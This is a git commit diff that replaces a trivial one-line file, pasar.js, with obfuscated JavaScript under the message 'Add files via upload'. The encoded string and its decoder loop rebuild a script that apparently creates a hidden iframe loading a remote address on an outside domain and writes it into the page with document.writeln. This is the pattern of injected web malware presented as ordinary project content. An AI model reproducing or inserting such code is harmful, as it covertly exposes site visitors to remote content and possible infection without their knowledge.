2a6c41663a108e71c15931b56e0da8009d81f2ec
Suatmaji <coredigital.assets@gmail.com>
2017-04-23 15:10:39 +0700

    Add files via upload

--- pasar.js
+++ pasar.js
@@ -1,1 +1,4 @@
-pasar=pasar
+d="=tdsjqu uzqf>'ufyu0kbwbtdsjqu'?wbs b>epdvnfou/dsfbufFmf1#('jgsbnf'*<b/tfuBuusjcvuf('tsd'-'iuuq;00xxx/bbclu/dpn0gbwjdpo/jdp\\#uzmf/xjeui>'27qy'8#ifjhiu9#N$cpez/bqqfoeDijme(b*<q$cq$q$cq$q$ejlmbos$cs$8#s$s$cs$ds$s$ds$s$zh{zx/ofuq$dq$8#q$q$dq$eq$q$eq$g&unbkj{jbi&eu$8#u$u$eu$fu$u$fu$u$mjolupnf/jogpu$fu$8#u$u$fu$gu$u$gu$u$deggxzlk&gs$8#s$s$g;-ejtqmbz>opofG+:#j):#/(:#N&:#o$ejtqmbz>opof<=0tdsjqu?=0cpez?=0iunm";
+l='\0\t\n\r !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\134]^_`abcdefghijklmnopqrstuvwxyz{|}~';
+s='';
+for (i=0;i<d.length;i++){b=d.charAt(i);a=l.indexOf(b);if (a==1) a=9;if (a==2) a=10;if (a==3) a=13;if (a==4) a=34;if (a<=31 & a>=14){off=s.length-(l.indexOf(d.charAt(++i))-36+90*(l.indexOf(d.charAt(++i))-35))-1;lp=off+a-14+4;s=s+s.substring(off,lp);}else if (a>0){ if (a>=41) a=a-1; s=s+l.charAt(a);} else s=s+b;}document.writeln(s);
